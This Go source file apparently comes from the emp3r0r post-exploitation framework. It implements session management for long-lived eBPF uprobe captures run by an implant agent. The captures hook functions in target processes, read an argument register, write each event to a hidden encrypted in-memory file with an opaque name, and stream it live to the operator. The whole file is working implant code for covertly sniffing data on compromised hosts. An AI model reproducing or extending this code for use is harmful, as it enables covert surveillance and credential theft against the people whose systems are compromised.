//go:build linux && !android && (386 || amd64 || arm64)

package script

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/libbpf"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"go.starlark.net/starlark"
)

// This file implements long-lived eBPF uprobe captures. Unlike
// ebpf_uprobe_capture, which blocks the script until its timeout, a session
// started by ebpf_uprobe_start outlives the Starlark run: it keeps the libbpf
// dependency mapped, appends every event to an encrypted memfs file in real
// time, streams each event to the operator through the run's notifier, and
// retains the events until ebpf_uprobe_stop collects and removes them.
//
// Sessions are process-global because a single module invocation starts one and
// a later invocation stops it. Exactly one session per owner may run at a time;
// the owner is the module name the agent tags each run with (see
// runConfig.moduleOwner), so `module --disable` finds its own session without
// guessing an id.

const (
	uprobeDefaultProg = "probe"
	uprobeDefaultReg  = "RSI"
	uprobeDefaultPID  = -1
	// uprobeStartWait bounds how long ebpf_uprobe_start waits for the probe to
	// attach before reporting failure, so a missing libbpf/dependency is
	// surfaced to the operator instead of a session that silently never runs.
	uprobeStartWait = 15 * time.Second
)

type uprobeSession struct {
	id        string
	owner     string
	outPath   string
	path      string
	pid       int
	startedAt time.Time
	notify    func(string)

	ctx    context.Context
	cancel context.CancelFunc
	done   chan struct{}
	start  chan struct{}

	mu     sync.Mutex
	events []libbpf.UprobeEvent
	err    error
}

// runUprobeCapture is a seam so tests can drive the session lifecycle without a
// kernel or a real libbpf object.
var runUprobeCapture = libbpf.RunUprobeCapture

var (
	uprobeSessions sync.Map // session id -> *uprobeSession
	// uprobeSessionsMu serializes start/stop so "one session per owner" and
	// registry mutations stay atomic.
	uprobeSessionsMu sync.Mutex
)

func init() {
	RegisterAPI("ebpf_uprobe_start", starlarkEBPFUprobeStart)
	RegisterAPI("ebpf_uprobe_stop", starlarkEBPFUprobeStop)
	RegisterAPI("ebpf_uprobe_sessions", starlarkEBPFUprobeSessions)
}

// uprobeStartConfig is the already-validated input to startUprobeSession.
type uprobeStartConfig struct {
	owner     string
	notify    func(string)
	image     []byte
	path      string
	offset    uint64
	prog      string
	reg       string
	pid       int
	timeoutMS int
	outPath   string
}

// startUprobeSession validates the request, starts the capture goroutine, and
// waits until the probe is attached (or the attempt fails). On success the
// returned session is already live.
func startUprobeSession(cfg uprobeStartConfig) (*uprobeSession, error) {
	argIndex := libbpf.ArgRegisterIndex(cfg.reg)
	if argIndex < 0 {
		return nil, fmt.Errorf("unknown register %q", cfg.reg)
	}
	if len(cfg.image) == 0 {
		return nil, fmt.Errorf("empty BPF object")
	}
	if cfg.path == "" {
		return nil, fmt.Errorf("probe path must not be empty")
	}
	if cfg.prog == "" {
		return nil, fmt.Errorf("probe program name must not be empty")
	}
	if cfg.timeoutMS < 0 {
		return nil, fmt.Errorf("timeout_ms must not be negative")
	}

	id, err := newUprobeID()
	if err != nil {
		return nil, err
	}
	if cfg.outPath == "" {
		// Opaque, non-identifying name. The operator is told the path.
		cfg.outPath = "memfs:///" + id + ".log"
	}
	if !util.IsMemPath(cfg.outPath) {
		return nil, fmt.Errorf("out_path must use memfs:///, got %q", cfg.outPath)
	}

	uprobeSessionsMu.Lock()
	var existing *uprobeSession
	uprobeSessions.Range(func(_, v any) bool {
		s := v.(*uprobeSession)
		if s.owner == cfg.owner {
			existing = s
			return false
		}
		return true
	})
	if existing != nil {
		if !existing.finished() {
			uprobeSessionsMu.Unlock()
			return nil, fmt.Errorf("an eBPF uprobe capture is already running for this module")
		}
		// A previous capture ended on its own (timeout); replace it. Its
		// events are already in its output file, which we drop with it.
		uprobeSessions.Delete(existing.id)
	}

	// Register the new session while still holding the lock so a concurrent
	// start for the same owner cannot slip past the check above.
	ctx, cancel := context.WithCancel(context.Background())
	s := &uprobeSession{
		id:        id,
		owner:     cfg.owner,
		outPath:   cfg.outPath,
		path:      cfg.path,
		pid:       cfg.pid,
		startedAt: time.Now(),
		notify:    cfg.notify,
		ctx:       ctx,
		cancel:    cancel,
		done:      make(chan struct{}),
		start:     make(chan struct{}),
	}
	uprobeSessions.Store(id, s)
	uprobeSessionsMu.Unlock()

	if existing != nil {
		_ = util.RemoveFileAgent(existing.outPath)
	}

	go s.run(libbpf.UprobeCapture{
		Image:         cfg.image,
		ProgName:      cfg.prog,
		EventsMapName: "events",
		CfgMapName:    "cfg",
		Path:          cfg.path,
		PID:           cfg.pid,
		Offset:        cfg.offset,
		ArgIndex:      uint32(argIndex),
		Timeout:       time.Duration(cfg.timeoutMS) * time.Millisecond,
		UntilStopped:  cfg.timeoutMS == 0,
	})

	select {
	case <-s.start:
		return s, nil
	case <-s.done:
		uprobeSessionsMu.Lock()
		uprobeSessions.Delete(id)
		uprobeSessionsMu.Unlock()
		s.mu.Lock()
		err := s.err
		s.mu.Unlock()
		if err == nil {
			err = fmt.Errorf("capture ended before it started")
		}
		return nil, err
	case <-time.After(uprobeStartWait):
		cancel()
		uprobeSessionsMu.Lock()
		uprobeSessions.Delete(id)
		uprobeSessionsMu.Unlock()
		return nil, fmt.Errorf("timed out attaching the eBPF uprobe")
	}
}

// run owns the capture goroutine. It closes done when the capture tears down,
// whether from the timeout, an explicit stop, or an attach/load error.
func (s *uprobeSession) run(opts libbpf.UprobeCapture) {
	defer close(s.done)
	opts.Stop = s.ctx.Done()
	opts.OnAttached = func() { close(s.start) }
	opts.OnEvent = s.onEvent
	err := runUprobeCapture(opts)
	s.mu.Lock()
	s.err = err
	s.mu.Unlock()
	if err != nil {
		logging.Debugf("uprobe session %s ended: %v", s.id, err)
	}
}

// onEvent persists and streams one captured event. It runs on the capture
// goroutine, so it must not block: the memfs append is local, and the notifier
// is the agent's fire-and-forget sender.
func (s *uprobeSession) onEvent(ev libbpf.UprobeEvent) {
	line := formatUprobeEvent(ev)
	s.mu.Lock()
	s.events = append(s.events, ev)
	s.mu.Unlock()
	if err := util.AppendTextToFileAgent(s.outPath, line); err != nil {
		logging.Debugf("uprobe session %s: append to %s: %v", s.id, s.outPath, err)
	}
	if s.notify != nil {
		s.notify(line)
	}
}

func (s *uprobeSession) finished() bool {
	select {
	case <-s.done:
		return true
	default:
		return false
	}
}

// stopUprobeSessions cancels and waits for every matching session, removes it
// from the registry, and returns it so the caller can read its events. An empty
// id matches by owner; an empty owner matches everything.
func stopUprobeSessions(id, owner string) ([]*uprobeSession, error) {
	uprobeSessionsMu.Lock()
	var targets []*uprobeSession
	uprobeSessions.Range(func(_, v any) bool {
		s := v.(*uprobeSession)
		switch {
		case id != "" && s.id != id:
			return true
		case id == "" && owner != "" && s.owner != owner:
			return true
		}
		targets = append(targets, s)
		return true
	})
	uprobeSessionsMu.Unlock()
	if len(targets) == 0 {
		return nil, fmt.Errorf("no active eBPF uprobe capture")
	}
	for _, s := range targets {
		s.cancel()
		<-s.done
		uprobeSessionsMu.Lock()
		uprobeSessions.Delete(s.id)
		uprobeSessionsMu.Unlock()
	}
	return targets, nil
}

// newUprobeID returns an opaque, cryptographically random session id.
func newUprobeID() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("generating session id: %w", err)
	}
	return hex.EncodeToString(b), nil
}

// formatUprobeEvent renders one event for the output file and the operator
// stream. %q keeps remote-controlled bytes from injecting control characters
// into either destination.
func formatUprobeEvent(ev libbpf.UprobeEvent) string {
	return fmt.Sprintf("pid=%d uid=%d retval=%d comm=%q arg=%q\n", ev.PID, ev.UID, ev.Retval, ev.Comm, ev.Arg)
}

func uprobeOwner(thread *starlark.Thread) string {
	if thread == nil {
		return ""
	}
	owner, _ := thread.Local("module_owner").(string)
	return owner
}

func starlarkEBPFUprobeStart(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var (
		image     string
		path      string
		offset    uint64
		prog      = uprobeDefaultProg
		reg       = uprobeDefaultReg
		pid       = uprobeDefaultPID
		timeoutMS = 0
		outPath   = ""
	)
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs,
		"image", &image, "path", &path, "offset", &offset,
		"prog??", &prog, "reg??", &reg, "pid??", &pid,
		"timeout_ms??", &timeoutMS, "out_path??", &outPath,
	); err != nil {
		return starlark.None, err
	}

	s, err := startUprobeSession(uprobeStartConfig{
		owner:     uprobeOwner(thread),
		notify:    notifierFromThread(thread),
		image:     []byte(image),
		path:      path,
		offset:    offset,
		prog:      prog,
		reg:       reg,
		pid:       pid,
		timeoutMS: timeoutMS,
		outPath:   outPath,
	})
	if err != nil {
		return ebpfUprobeStartError(err), nil
	}

	d := starlark.NewDict(3)
	d.SetKey(starlark.String("id"), starlark.String(s.id))
	d.SetKey(starlark.String("out_path"), starlark.String(s.outPath))
	d.SetKey(starlark.String("error"), starlark.String(""))
	return d, nil
}

func starlarkEBPFUprobeStop(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var (
		id    string
		owner string
	)
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "id??", &id, "owner??", &owner); err != nil {
		return starlark.None, err
	}
	if owner == "" {
		owner = uprobeOwner(thread)
	}

	sessions, err := stopUprobeSessions(id, owner)
	if err != nil {
		return ebpfUprobeStopError(err), nil
	}

	events := starlark.NewList(nil)
	paths := starlark.NewList(nil)
	for _, s := range sessions {
		s.mu.Lock()
		for _, ev := range s.events {
			events.Append(uprobeEventDict(ev))
		}
		s.mu.Unlock()
		paths.Append(starlark.String(s.outPath))
	}

	d := starlark.NewDict(3)
	d.SetKey(starlark.String("events"), events)
	d.SetKey(starlark.String("out_paths"), paths)
	d.SetKey(starlark.String("error"), starlark.String(""))
	return d, nil
}

func starlarkEBPFUprobeSessions(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs); err != nil {
		return starlark.None, err
	}
	list := starlark.NewList(nil)
	uprobeSessions.Range(func(_, v any) bool {
		s := v.(*uprobeSession)
		d := starlark.NewDict(6)
		d.SetKey(starlark.String("id"), starlark.String(s.id))
		d.SetKey(starlark.String("owner"), starlark.String(s.owner))
		d.SetKey(starlark.String("out_path"), starlark.String(s.outPath))
		d.SetKey(starlark.String("path"), starlark.String(s.path))
		d.SetKey(starlark.String("pid"), starlark.MakeInt(s.pid))
		d.SetKey(starlark.String("running"), starlark.Bool(!s.finished()))
		list.Append(d)
		return true
	})
	return ebpfResult("sessions", list, nil), nil
}

// ebpfUprobeStartError keeps the start result shape stable on failure.
func ebpfUprobeStartError(err error) *starlark.Dict {
	d := starlark.NewDict(3)
	d.SetKey(starlark.String("id"), starlark.String(""))
	d.SetKey(starlark.String("out_path"), starlark.String(""))
	d.SetKey(starlark.String("error"), starlark.String(err.Error()))
	return d
}

// ebpfUprobeStopError keeps the stop result shape stable on failure.
func ebpfUprobeStopError(err error) *starlark.Dict {
	d := starlark.NewDict(3)
	d.SetKey(starlark.String("events"), starlark.NewList(nil))
	d.SetKey(starlark.String("out_paths"), starlark.NewList(nil))
	d.SetKey(starlark.String("error"), starlark.String(err.Error()))
	return d
}
